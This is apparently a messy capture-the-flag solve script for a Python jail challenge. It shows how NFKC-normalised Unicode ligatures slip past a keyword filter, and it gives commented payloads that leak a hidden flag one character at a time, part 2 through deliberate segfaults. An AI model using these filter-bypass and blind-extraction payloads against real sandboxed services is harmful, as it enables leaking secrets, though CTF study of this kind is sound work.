import unicodedata
from string import printable

for i in range(10869):
    c = chr(i)
    x = unicodedata.normalize('NFKC', c)
    if x != c and len(x) > 1:
        print(c, x, i)


kk = [
    'ﬀ', 'ﬁ', 'ﬂ', 'ﬃ', 'ﬄ', 'ﬅ', 'ﬆ',  # Latin ligatures
    'Ǆ', 'ǅ', 'ǆ', 'Ǉ', 'ǈ', 'ǉ',        # Serbian and Croatian ligatures
    'Æ', 'æ', 'Œ', 'œ', 'Ĳ', 'ĳ',        # Latin extended ligatures
    'Ꜳ', 'ꜳ', 'Ꜵ', 'ꜵ', 'Ꜷ', 'ꜷ',      # Additional Latin ligatures
    'Ꜹ', 'ꜹ', 'Ꜻ', 'ꜻ', 'Ꜽ', 'ꜽ', 
]

"""
OKAY sorry this is all very messy

this is part 1 solve, if you run both commands, you'll see that the
__flags__ in float are different, so you can check each character
"""
# ﬀﬄag[0]>'S'or .1.a
# ﬀﬄag[0]>'Q'or .1.a

"""
This is part 2 solve, i messed up. This is actually solvable because I did not put the second print of "oh i can see again" in a finally block, so any kind of error would prevent the second print from being seen

Instead, the idea behind this solve is to trigger a segfault which immediately terminates the server connection, so even if the print message is in the finally block, it wouldnt print at all
"""

"""
This is the payload before being reversed
"""
# galf[0]>'}'or(*rr({}),)
# galf[0]>'S'or(*rr({}),)

"""
This is the payload after being reversed. Send both commands and see the different output from the server
"""
# ),)}{(rr*(ro'}'>]0[flag
# ),)}{(rr*(ro'u'>]0[flag

# pass
#  ),)}{(rr*(ro'h'>]0[flag

# fail
# ),)}{(rr*(ro'~'>]0[flag

# ),)}{(rr*(ro' '>]0[flag